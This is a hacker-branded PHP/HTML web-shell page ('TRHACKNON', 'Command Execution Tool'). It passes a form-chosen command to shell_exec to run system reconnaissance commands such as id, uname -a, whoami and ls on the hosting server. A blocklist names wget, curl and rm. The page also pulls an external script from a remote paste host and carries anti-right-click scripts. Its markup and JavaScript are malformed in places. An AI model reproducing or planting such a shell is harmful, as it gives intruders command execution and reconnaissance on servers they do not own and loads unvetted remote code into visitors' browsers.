<!DOCTYPE html>
<html>
<head>  <link rel="stylesheet" href="scsh.css"><link rel="stylesheet" href="closty.css"><script type="text/javascript" src="https://hastebytrhacknon.trhacknon.repl.co/raw/ozivuhesecaj"></script>
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'><style src="scsh.js"></style>
</head>
<body>
	<h1>Commande Shell</h1>	<script src="clock.js"></script>
  <script src="weath.js"></script>
<br><br><br>
	<div id="logo-container">
	</div><div id="Clock" align="center" style="font-size:58px;font-family:'iceland';color:red;"></div><hr width="100%"><br><br><font face=Orbitron color=red size=12><center>TRHACKNON<br></center></font><br></b></div>
		<br><br>
	<meta charset="UTF-8">
	<title>Command Execution Tool</title>
</head>
<body>
	<h1>Command Execution Tool</h1>
	<form action="console.php" method="GET">
		<label for="cmd">Choose a command:</label>
		<select name="cmd" id="cmd">
			<option value="id">id</option>
			<option value="uname -a">uname -a</option>
			<option value="ls">ls</option>
			<option value="whoami">whoami</option>
			<option value="hostname">hostname</option>
		</select>
		<input type="submit" value="Execute">
	</form>
	<?php
		$allowed_commands = array('id', 'uname -a', 'ls', 'whoami', 'hostname');
		$forbidden_commands = array('wget', 'curl', 'rm', 'cat', 'mv', 'cp', 'touch');

		if (isset($_GET['cmd']) && in_array($_GET['cmd'], $allowed_commands)) {
			$cmd = $_GET['cmd'];
			$output = shell_exec($cmd);
			echo "<pre>$output</pre>";
		} else if (isset($_GET['cmd']) && in_array($_GET['cmd'], $forbidden_commands)) {
			echo "<p>Command not allowed.</p>";
		}
	?>

        <script type='text/javascript'>
        //<![CDATA[
        // Anti Klik Kanan
        var message="pas toucher ! T'as pas le droit";
        function clickIE4(){if(2==event.button)return alert(message),!1}
        function clickNS4(e){if((document.layers||document.getElementById&&!document.all)&&(2==e.which||3==e.which))return alert(message),!1}
        document.layers?(document.captureEvents(Event.MOUSEDOWN),document.onmousedown=clickNS4):document.all&&!document.getElementById&&(document.onmousedown=clickIE4),document.oncontextmenu=new Function("alert(message);return false");
        //]]>
        </script>
        <script language="Javascript">
        var msg="Ngotak sendiri cok jan copas";
        function rtclickcheck(keyp){
        if(navigator.appName == "Netscape" && keyp.which == 3){
        alert(msg);
        return false;
        if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) {
        alert(msg);
        return false;
        }
        }
        document.onmousedown=rtclickcheck
        </script>
        <script>
        setInterval(function(){
             $(".berkedip").toggle();
        },300);
</script>
    </body>
</html>
